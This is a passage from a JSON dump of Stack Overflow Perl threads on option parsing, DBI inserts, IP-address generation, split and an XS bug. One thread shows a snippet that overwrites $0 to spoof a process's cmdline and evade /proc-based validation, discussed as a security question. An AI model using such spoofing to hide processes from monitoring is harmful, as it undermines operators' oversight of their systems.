"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 0, "last_activity_date": 1457091586, "creation_date": 1457091586, "answer_id": 35795130, "question_id": 35793994, "link": "https://stackoverflow.com/questions/35793994/multiple-command-line-arguments-in-perl-when-one-argument-mistakenly-takes-other/35795130#35795130", "title": "Multiple command line arguments in perl when one argument mistakenly takes other argument as its value", "body": "<p>What error would you expect? The <code>-f</code> option has an argument, and the <code>-p</code> option wasn't specified.  You have to handle mandatory or extra options yourself:</p>\n\n<pre><code>die \"Missing -p\\n\" unless defined $opt_p;\ndie \"Missing -f\\n\" unless defined $opt_f;\ndie \"Extra arguments @ARGV\\n\" if @ARGV;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1457092671, "post_id": 35795240, "comment_id": 59260542, "body": "This nails it.  I completely forgot the difference."}, {"owner": {"reputation": 31, "user_id": 6017798, "user_type": "registered", "profile_image": "https://graph.facebook.com/1060543994007223/picture?type=large", "display_name": "Sruthi Subramanyam", "link": "https://stackoverflow.com/users/6017798/sruthi-subramanyam"}, "edited": false, "score": 0, "creation_date": 1457590955, "post_id": 35795240, "comment_id": 59477506, "body": "Thanks for letting me know the difference. In most of the documents, difference between =s and :s is explained only in terms of optional/non-optional. But it is an important point to remember - &quot;hat even if the string argument starts with - or --, it will not be considered an option on itself&quot;"}], "tags": [], "owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "is_accepted": false, "score": 4, "last_activity_date": 1457091938, "creation_date": 1457091938, "answer_id": 35795240, "question_id": 35793994, "link": "https://stackoverflow.com/questions/35793994/multiple-command-line-arguments-in-perl-when-one-argument-mistakenly-takes-other/35795240#35795240", "title": "Multiple command line arguments in perl when one argument mistakenly takes other argument as its value", "body": "<p>You should use <code>:</code> instead of <code>=</code>.</p>\n\n<p>You should check \"Summary of Option Specifications\" in <a href=\"http://perldoc.perl.org/Getopt/Long.html\" rel=\"nofollow\"><code>Getopt::Long</code></a>. This is from <a href=\"http://search.cpan.org/~chips/perl5.004_05/lib/Getopt/Long.pm\" rel=\"nofollow\"><code>GetOptions</code></a>.</p>\n\n<blockquote>\n  <p><code>=s</code>: Option takes a mandatory string argument. This string will be assigned to the option variable. Note that even if the string argument\n  starts with - or --, it will not be considered an option on itself.</p>\n  \n  <p><code>:s</code>: Option takes an optional string argument. This string will be\n  assigned to the option variable. If omitted, it will be assigned \"\"\n  (an empty string). If the string argument starts with - or --, it will\n  be considered an option on itself.</p>\n</blockquote>\n\n<p>Below should work. If you ommit any argument, the corresponding variable will be assigned <code>\"\"</code>.</p>\n\n<pre><code>GetOptions ('f:s' =&gt; \\$opt_f,\n            'p:s' =&gt; \\$opt_p,\n           ) or die(\"Error in command line arguments\\n\");\n\n# later you can check for argument variable if any option is mendatory for you.\ndie \"No value passed to -f\\n\" unless($opt_f);\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 6017798, "user_type": "registered", "profile_image": "https://graph.facebook.com/1060543994007223/picture?type=large", "display_name": "Sruthi Subramanyam", "link": "https://stackoverflow.com/users/6017798/sruthi-subramanyam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 184, "favorite_count": 1, "answer_count": 2, "score": 3, "last_activity_date": 1457093033, "creation_date": 1457088251, "last_edit_date": 1457091022, "question_id": 35793994, "link": "https://stackoverflow.com/questions/35793994/multiple-command-line-arguments-in-perl-when-one-argument-mistakenly-takes-other", "title": "Multiple command line arguments in perl when one argument mistakenly takes other argument as its value", "body": "<p>I am working on a perl program (perl 5.8). This program uses command line arguments for its inputs. \nThe problem I face is this - I am using multiple command line arguments. \nE.g.</p>\n\n<pre><code>tool -f \"arg1_val\" -p \"arg2_val\"\n</code></pre>\n\n<p>But in cases when user forgets to specify a value say</p>\n\n<pre><code>tool -f -p \"arg2_val\"\n</code></pre>\n\n<p>Instead of erroring out, it assumes -f = -p </p>\n\n<p>I am using <a href=\"http://p3rl.org/Getopt::Long\" rel=\"nofollow\">Getopt::Long</a> and the routine GetOptions</p>\n\n<pre><code>GetOptions (\"f=s\" =&gt; \\$opt_f,\n            \"p=s\" =&gt; \\$opt_p,\n           );\n</code></pre>\n"}, {"tags": ["linux", "perl", "procfs", "spoof", "cmdline-args"], "answers": [{"comments": [{"owner": {"reputation": 4494, "user_id": 3727050, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/OFrev.png?s=128&g=1", "display_name": "urban", "link": "https://stackoverflow.com/users/3727050/urban"}, "edited": false, "score": 0, "creation_date": 1457086920, "post_id": 35792412, "comment_id": 59256824, "body": "Hi Sobrique. I see what you are saying and I admit I am using the <code>cmdline</code> probably for something I shouldn&#39;t (see <a href=\"http://stackoverflow.com/questions/34380618/password-management-for-non-interactive-process\">this one</a>). I also see the usefulness of it in parallel processing. My second question is more about if I can detect that the cmdline has been modified to something other than the first/original value"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 4494, "user_id": 3727050, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/OFrev.png?s=128&g=1", "display_name": "urban", "link": "https://stackoverflow.com/users/3727050/urban"}, "edited": false, "score": 0, "creation_date": 1457092224, "post_id": 35792412, "comment_id": 59260287, "body": "But that&#39;s every process.  The &quot;parent&quot; of every process on your system is ultimately <code>init</code>. Everything else did a fork and exec from there - and in the process, changed its name. Files don&#39;t know their own name, names are just how the directory structure finds a particular inode. So processes don&#39;t know their own name either,  aside from setting $0 to something appropriate."}, {"owner": {"reputation": 4494, "user_id": 3727050, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/OFrev.png?s=128&g=1", "display_name": "urban", "link": "https://stackoverflow.com/users/3727050/urban"}, "edited": false, "score": 0, "creation_date": 1457092931, "post_id": 35792412, "comment_id": 59260694, "body": "I see... makes sense... and I was afraid that it would be the case - I accept your answer since you cover both questions. The technical info you provide is also very much appreciated  - cheers for that :)"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 6, "last_activity_date": 1457083877, "creation_date": 1457083877, "answer_id": 35792412, "question_id": 35791624, "link": "https://stackoverflow.com/questions/35791624/why-is-it-allowed-to-modify-argv0/35792412#35792412", "title": "Why is it allowed to modify argv[0]?", "body": "<p>To answer 1:</p>\n\n<p>It's because of how starting a new process actually works. </p>\n\n<p>You <code>fork()</code> to spawn a duplicate instance of your current process, and then you <code>exec()</code> to start the new thing - it replaces your <em>current</em> process with the 'new' process, and as a result - it <em>has</em> to rewrite <code>$0</code>. </p>\n\n<p>This is actually quite useful though when running parallel code - I do it fairly frequently when <code>fork()</code>ing code, because it makes it easy to spot which 'thing' is getting stuck/running hot. </p>\n\n<p>E.g.:</p>\n\n<pre><code>use Parallel::ForkManager;\nmy $manager = Parallel::ForkManager -&gt; new ( 10 ); \n\nforeach my $server ( @list_of_servers ) {\n    $manager -&gt; start and next;\n    $0 = \"$0 child: ($server)\";\n    #do stuff;\n    $manager -&gt; finish;\n}\n</code></pre>\n\n<p>You can instantly see in your <code>ps</code> list what's going on. You'll see this sort of behaviour with many multiprocessing services like <code>httpd</code>. </p>\n\n<p>But it isn't a vulnerability, unless you assume it's something that it's not (as you do). No more than being able to 'mv' a binary anyway. </p>\n\n<p>Anyway, to answer 2... prevent or detect what? I mean, you can't tell what a process is doing from the command line, but you can't tell what it's doing otherwise anyway (there's plenty of ways to make a piece of code do something 'odd' behind the scenes). </p>\n\n<p>The answer is - trust your security model. Don't run untrusted code in a privileged context, and it's largely irrelevant what they call it. Sure, you could write rude messages in the process list, but it's pretty obvious who's doing it.</p>\n"}], "owner": {"reputation": 4494, "user_id": 3727050, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/OFrev.png?s=128&g=1", "display_name": "urban", "link": "https://stackoverflow.com/users/3727050/urban"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 385, "favorite_count": 1, "accepted_answer_id": 35792412, "answer_count": 1, "score": 2, "last_activity_date": 1601071189, "creation_date": 1457081390, "last_edit_date": 1601071189, "question_id": 35791624, "link": "https://stackoverflow.com/questions/35791624/why-is-it-allowed-to-modify-argv0", "title": "Why is it allowed to modify argv[0]?", "body": "<p>I have been working on a project that uses PIDs, <code>/proc</code> and command line analysis to validate processes on a system. My code had to be checked by the security guys who manage to break it with a single line... embarrassing!</p>\n<pre><code>#!/usr/bin/env perl\n\n$0=&quot;I am running wild&quot;; # I had no clue you can do this!\n\nsystem(&quot;cat /proc/$$/cmdline&quot;);\nprint(&quot;\\n&quot;);\nsystem(&quot;ps -ef | grep $$&quot;);\n\n# do bad stuff here...\n</code></pre>\n<p>My questions:</p>\n<ol>\n<li><p>I see some uses cases for the above, like hiding passwords given on the command line (also bad practice) but I see a lot more problems/issues when one can hide processes and spoof <code>cmdline</code>. Is there a reason it is allowed? Isn't it a system vulnerability?</p>\n</li>\n<li><p>How can I prevent or detect this? I have looked into <code>/proc</code> mount options. I also know that one can use <code>lsof</code> to identify spoofed processes based on unexpected behavior, but this won't work in my case. At the moment I am using a simple method to detect if the <code>cmdline</code> contains at least one null (<code>\\0</code>) character which assumes that at least one argument is present. In the above code, spaces need to be replaced with nulls to bypass that check which is something I couldn't find how to implement in Perl - writes up to the first <code>\\0</code>.</p>\n</li>\n</ol>\n"}, {"tags": ["mysql", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1457080118, "post_id": 35790365, "comment_id": 59252607, "body": "Can you show the actual code that creates your <code>@qq</code> please"}, {"owner": {"reputation": 7570, "user_id": 17945, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/e8cbc0b9ed29b027a127d8df309af5a6?s=128&d=identicon&r=PG", "display_name": "reinierpost", "link": "https://stackoverflow.com/users/17945/reinierpost"}, "edited": false, "score": 3, "creation_date": 1457080651, "post_id": 35790365, "comment_id": 59252856, "body": "The error message says <code>@qq</code> has 8 values and should contain 3. We know it should contain 3, as there are 3 question marks in the premare statement. But we can&#39;t tell from your description how many values it actually contains, nor whether the prepare statement is correct. What are the column names of your table <code>$table</code>?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1457087177, "post_id": 35790365, "comment_id": 59257009, "body": "&quot;@qq contains below test&quot; - that&#39;s not really helpful. <code>@qq</code> is an array and you&#39;ve told us that it contains a single scalar value. Is this text split across various elements of <code>@qq</code>? It is all in <code>$qq[0]</code>? Are the other values in other elements of <code>@qq</code>?"}, {"owner": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "edited": false, "score": 0, "creation_date": 1457334707, "post_id": 35790365, "comment_id": 59342272, "body": "I have changed my approach, but for understanding: @qq contains 6 elements(6 lines)."}], "answers": [{"comments": [{"owner": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "edited": false, "score": 1, "creation_date": 1457334863, "post_id": 35791356, "comment_id": 59342360, "body": "I used the approach of replacing all the &#39;\\n&#39; with a special character. This worked. Thanks for different options in the answer."}], "tags": [], "owner": {"reputation": 42833, "user_id": 18914, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7a20a39ae2ef47ae042a3eddd5b5bd19?s=128&d=identicon&r=PG", "display_name": "Dave Sherohman", "link": "https://stackoverflow.com/users/18914/dave-sherohman"}, "is_accepted": true, "score": 5, "last_activity_date": 1457080442, "creation_date": 1457080442, "answer_id": 35791356, "question_id": 35790365, "link": "https://stackoverflow.com/questions/35790365/inserting-an-array-with-single-quotes-in-database-with-perl-dbi/35791356#35791356", "title": "Inserting an array with single quotes(&#39;) in database with perl DBI", "body": "<p>Each SQL parameter (<code>?</code>) must receive <em>exactly one</em> value when you execute the query.  The array <code>@qq</code> contains multiple values.  Based on the error message, the array must contain six elements.</p>\n\n<p>Looking at your query, I'm guessing that you want the entire content of the array to go into a single field.  If so, you should be able to use</p>\n\n<pre><code>$stmt_in-&gt;execute($q_num,$datatype, join(\"\\n\", @qq)) or die...\n</code></pre>\n\n<p>to achieve this, possibly replacing the <code>\\n</code> with another character/string that you want inserted between the array's values.</p>\n\n<p>Alternately, if you want to insert only the first element in the array (which could be the case since the question only shows a single element), use</p>\n\n<pre><code>$stmt_in-&gt;execute($q_num,$datatype,$qq[0]) or die...\n</code></pre>\n\n<p>If you want to insert all array elements with each element going into a separate field in the table, you need to construct a query with the right number of placeholders, most likely by using <code>join(', ', ('?') x @qq)</code> if the array's size is variable.</p>\n"}], "owner": {"reputation": 77, "user_id": 3354544, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/6ecefba1d9ba5471f5cd16c183a696a1?s=128&d=identicon&r=PG&f=1", "display_name": "JustStarted", "link": "https://stackoverflow.com/users/3354544/juststarted"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 291, "favorite_count": 0, "accepted_answer_id": 35791356, "answer_count": 1, "score": 0, "last_activity_date": 1457080442, "creation_date": 1457076504, "question_id": 35790365, "link": "https://stackoverflow.com/questions/35790365/inserting-an-array-with-single-quotes-in-database-with-perl-dbi", "title": "Inserting an array with single quotes(&#39;) in database with perl DBI", "body": "<p>I am trying to insert an array into database and my query is as below:</p>\n\n<p><strong>DBD::mysql::st execute failed: called with 8 bind variables when 3 are needed at main.pl line 114,  line 7.</strong></p>\n\n<pre><code>my $sql_in = \"INSERT INTO $table VALUES(?,?,?,'','','','')\";\nmy $stmt_in = $dbh-&gt;prepare($sql_in) or die \"Couldn't prepare statement: \".$dbh-&gt;errstr;\n$stmt_in-&gt;execute($q_num,$datatype,@qq) or die \"Couldn't execute statement:\".$stmt_in-&gt;errstr;\n$stmt_in-&gt;finish;\n</code></pre>\n\n<p>@qq contains below test:</p>\n\n<blockquote>\n  <p>Reporting that one of @its many problems had been the recent@ extended\n  sales slump in women's apparel, the seven-store retailer said it would\n  start a three-month liquidation sale in all of its stores. \n  (A) its many problems had been the recent (B) its many problems has been the\n  recently (C) its many problems is the recently (D) their many problems\n  is the recent (E) their many problems had been the recent</p>\n</blockquote>\n"}, {"tags": ["perl", "command-line", "ssh"], "answers": [{"comments": [{"owner": {"reputation": 263, "user_id": 5949518, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/ZDg29.png?s=128&g=1", "display_name": "Edward", "link": "https://stackoverflow.com/users/5949518/edward"}, "edited": false, "score": 0, "creation_date": 1457091412, "post_id": 35790777, "comment_id": 59259827, "body": "This will generate over 255 billion combinations.  There&#39;s only 4 billion possible IPs.  The maximum number is 4294967295, corresponding to address 255.255.255.255.  You may want to read up on this:  <a href=\"http://infowaves.eu/tutorials/iptonumber.php\" rel=\"nofollow noreferrer\">infowaves.eu/tutorials/iptonumber.php</a>"}, {"owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "edited": false, "score": 3, "creation_date": 1457092942, "post_id": 35790777, "comment_id": 59260699, "body": "Where do you come up with this number and why are you disparaging solutions apparently without testing them?"}], "tags": [], "owner": {"reputation": 4663, "user_id": 3967089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d00715119003023d62918dcc603ca7?s=128&d=identicon&r=PG&f=1", "display_name": "Calle Dybedahl", "link": "https://stackoverflow.com/users/3967089/calle-dybedahl"}, "is_accepted": false, "score": 2, "last_activity_date": 1457078071, "creation_date": 1457078071, "answer_id": 35790777, "question_id": 35789894, "link": "https://stackoverflow.com/questions/35789894/generate-list-of-ip-addresses-via-command-line/35790777#35790777", "title": "Generate List of IP Addresses via Command Line?", "body": "<p>There is no need to use any modules. This is a trivial problem.</p>\n\n<pre><code>for my $i (0..255) {\n    for my $j (0..255) {\n        for my $k (0..255) {\n            for my $l (0..255) {\n                printf(\"%d.%d.%d.%d\\n\", $i,$j,$k,$l)\n            }\n        }\n    }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 263, "user_id": 5949518, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/ZDg29.png?s=128&g=1", "display_name": "Edward", "link": "https://stackoverflow.com/users/5949518/edward"}, "edited": false, "score": 0, "creation_date": 1457091522, "post_id": 35791216, "comment_id": 59259899, "body": "A one-liner would be great if you can come up with one that works :) This will generate over 255 billion combinations.  There&#39;s only 4 billion possible IPs.  The maximum number is 4294967295, corresponding to address 255.255.255.255.  You may want to read up on this:  <a href=\"http://infowaves.eu/tutorials/iptonumber.php\" rel=\"nofollow noreferrer\">infowaves.eu/tutorials/iptonumber.php</a>"}, {"owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "reply_to_user": {"reputation": 263, "user_id": 5949518, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/ZDg29.png?s=128&g=1", "display_name": "Edward", "link": "https://stackoverflow.com/users/5949518/edward"}, "edited": false, "score": 2, "creation_date": 1457091784, "post_id": 35791216, "comment_id": 59260043, "body": "Huh?  Did you test it?  2**32 is 4 gigs, i.e. exactly the number you are asing for."}], "tags": [], "owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "is_accepted": true, "score": 1, "last_activity_date": 1457083509, "last_edit_date": 1457083509, "creation_date": 1457079919, "answer_id": 35791216, "question_id": 35789894, "link": "https://stackoverflow.com/questions/35789894/generate-list-of-ip-addresses-via-command-line/35791216#35791216", "title": "Generate List of IP Addresses via Command Line?", "body": "<p>One-liner time?</p>\n\n<pre><code>perl -MSocket=inet_ntoa -le 'print inet_ntoa(pack \"N\", $_) for 0..2**32-1'\n</code></pre>\n\n<p>Source: <a href=\"http://www.perlmonks.org/?node_id=786521\" rel=\"nofollow\">http://www.perlmonks.org/?node_id=786521</a> via quick googling.</p>\n\n<p>Perl isn't strictly necessary either, of course. The following generates a quick <code>sed</code> script on the fly and calls it successively.</p>\n\n<pre><code>octets () { sed \"h;$(for ((i=0; i&lt;256; i++)); do printf \"g;s/^/$i./p;\"; done)\"; }\noctets &lt;&lt;&lt;'' | octets | octets  | octets | sed 's/\\.$//'\n</code></pre>\n\n<p>The <code>octets</code> function generates 256 copies of its input with a (zero-based) line number and a dot prepended to each.  (You could easily append at the end instead, of course.)  In the <code>sed</code> scripting language, the <code>h</code> command copies the input to the hold space and <code>g</code> retrieves it back, overwriting whatever we had there before.  The C-style <code>for</code> loop and the <code>&lt;&lt;&lt;</code> here string are Bash extensions, so not POSIX shell.</p>\n"}], "owner": {"reputation": 263, "user_id": 5949518, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/ZDg29.png?s=128&g=1", "display_name": "Edward", "link": "https://stackoverflow.com/users/5949518/edward"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 126, "favorite_count": 0, "closed_date": 1457132246, "accepted_answer_id": 35791216, "answer_count": 2, "score": -2, "last_activity_date": 1457083509, "creation_date": 1457074775, "question_id": 35789894, "link": "https://stackoverflow.com/questions/35789894/generate-list-of-ip-addresses-via-command-line", "closed_reason": "Needs more focus", "title": "Generate List of IP Addresses via Command Line?", "body": "<p>I'm interested in using command line (possibly Perl) to generate a list of all possible IP addresses.</p>\n\n<p>I've done similar with PHP in the past by using the <code>long2ip</code> function and creating a list from 0 to the interger 4294967295.</p>\n\n<p>Is there a way to do this in Perl instead though?</p>\n\n<p>I'm basically just looking for the quickest way to generate a text file that has a list of all 4,294,967,296 possible IP addresses.</p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": true, "score": 7, "last_activity_date": 1457074931, "creation_date": 1457074931, "answer_id": 35789941, "question_id": 35789802, "link": "https://stackoverflow.com/questions/35789802/how-to-prevent-split-from-removing-empty-elements/35789941#35789941", "title": "how to prevent split from removing empty elements", "body": "<p>Split with a negative limit will preserve trailing empty fields.</p>\n\n<pre><code>@fields = split(/,/, \"a,,\", -1);\n</code></pre>\n"}], "owner": {"reputation": 2139, "user_id": 553766, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/8489617c16330b18bb4f15cadb26275a?s=128&d=identicon&r=PG", "display_name": "SAN", "link": "https://stackoverflow.com/users/553766/san"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 491, "favorite_count": 0, "accepted_answer_id": 35789941, "answer_count": 1, "score": 2, "last_activity_date": 1457074931, "creation_date": 1457074422, "question_id": 35789802, "link": "https://stackoverflow.com/questions/35789802/how-to-prevent-split-from-removing-empty-elements", "title": "how to prevent split from removing empty elements", "body": "<p>I see that perl removes all the empty elements when i split a string. Is this the expected behavior? I feel this should be left to the programmer to deal with empty fields</p>\n\n<pre><code>&gt; perl -e '@fields = split(/,/, \"a,,\"); print \"$#fields\\n\";'\n0\n&gt; perl -e '@fields = split(/,/, \"a,b,c\"); print \"$#fields\\n\";'\n2\n</code></pre>\n\n<p>Is there a way to prevent this?</p>\n"}, {"tags": ["perl", "coderef"], "comments": [{"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 3, "creation_date": 1457071873, "post_id": 35789074, "comment_id": 59248765, "body": "Can you provide a (minimal) complete program that exhibits the error?"}, {"owner": {"reputation": 188, "user_id": 3938923, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/7869e47ef194829636a91d5832b3d36b?s=128&d=identicon&r=PG&f=1", "display_name": "user62177541", "link": "https://stackoverflow.com/users/3938923/user62177541"}, "reply_to_user": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1457097335, "post_id": 35789074, "comment_id": 59263516, "body": "I&#39;d like to, but as I said it happens in this one package and not all. I can&#39;t post the entire package, but calling the above function in that package is sufficient to trigger the error. The package has nothing in it named &quot;a&quot;, variable, method, or otherwise and has no global or package level data at all. The package represents a class, with bless, so an instance method is called on the package, then that method calls the above function and then the error occurs. I will try to create a special package just to reproduce the error for you, but I may not have luck doing that."}, {"owner": {"reputation": 188, "user_id": 3938923, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/7869e47ef194829636a91d5832b3d36b?s=128&d=identicon&r=PG&f=1", "display_name": "user62177541", "link": "https://stackoverflow.com/users/3938923/user62177541"}, "reply_to_user": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1457098343, "post_id": 35789074, "comment_id": 59264241, "body": "I did just try to create a minimal example, a second class/package that invokes this &quot;whatever&quot; global function just like the other one, and the error does not occur. As I say it generally works. As I said in the debugger it also works. Any suggestions for tracking it even as well appreciated."}, {"owner": {"reputation": 188, "user_id": 3938923, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/7869e47ef194829636a91d5832b3d36b?s=128&d=identicon&r=PG&f=1", "display_name": "user62177541", "link": "https://stackoverflow.com/users/3938923/user62177541"}, "reply_to_user": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1457098806, "post_id": 35789074, "comment_id": 59264578, "body": "...Also the <code>whatever</code> function shown above is defined in the <code>main</code> package. The whatever function is just an ordinary function, not a method."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457105998, "post_id": 35789074, "comment_id": 59269719, "body": "Sounds like some buggy XS code or Perl internals left things in a illegal state."}, {"owner": {"reputation": 4663, "user_id": 3967089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d00715119003023d62918dcc603ca7?s=128&d=identicon&r=PG&f=1", "display_name": "Calle Dybedahl", "link": "https://stackoverflow.com/users/3967089/calle-dybedahl"}, "edited": false, "score": 0, "creation_date": 1457108141, "post_id": 35789074, "comment_id": 59271196, "body": "Do you get the same behavior if you use other names than <code>$a</code> and <code>$b</code>?"}, {"owner": {"reputation": 188, "user_id": 3938923, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/7869e47ef194829636a91d5832b3d36b?s=128&d=identicon&r=PG&f=1", "display_name": "user62177541", "link": "https://stackoverflow.com/users/3938923/user62177541"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457138471, "post_id": 35789074, "comment_id": 59286438, "body": "@ikegami I think you turned out to be right. I was looking through trying to locate where it was coming from and it looks like the origin of this problem is the fact that in one place inside this package I used <code>pairwise</code>, as in <code>List::MoreUtils</code> <code>pairwise</code>. I replaced that with a routine I have that does something similar and the problem is gone. @Calle, no I cannot freely choose the name as there aren&#39;t that many special variables like these, just <code>$_</code>, <code>$a</code>, and <code>$b</code>."}], "answers": [{"tags": [], "owner": {"reputation": 188, "user_id": 3938923, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/7869e47ef194829636a91d5832b3d36b?s=128&d=identicon&r=PG&f=1", "display_name": "user62177541", "link": "https://stackoverflow.com/users/3938923/user62177541"}, "is_accepted": false, "score": 0, "last_activity_date": 1457327581, "creation_date": 1457327581, "answer_id": 35836615, "question_id": 35789074, "link": "https://stackoverflow.com/questions/35789074/error-cannot-copy-to-array-in-scalar-assignment/35836615#35836615", "title": "Error: &quot;Cannot copy to ARRAY in scalar assignment&quot;", "body": "<p>I found the fix for me had to do with the fact that the package that was the only location where any problems were seen with use of this code had at one point in its lifetime prior to the problem appearing used <code>List::MoreUtils</code> <code>pairwise</code>. Some but not all of the problem behavior was reproducible in the debugger, and I tracked down where the \"buggy\" behavior began and it was after calling <code>pairwise</code>. I switched this call to use one of my own routines that does essentially the same thing and the problem is completely gone (thank God). This was quite a disturbing issue. As @ikegami noted, \"buggy XS code\" may be the problem, and my routine is pure Perl without any XS code.</p>\n"}], "owner": {"reputation": 188, "user_id": 3938923, "user_type": "registered", "accept_rate": 50, "profile_image": 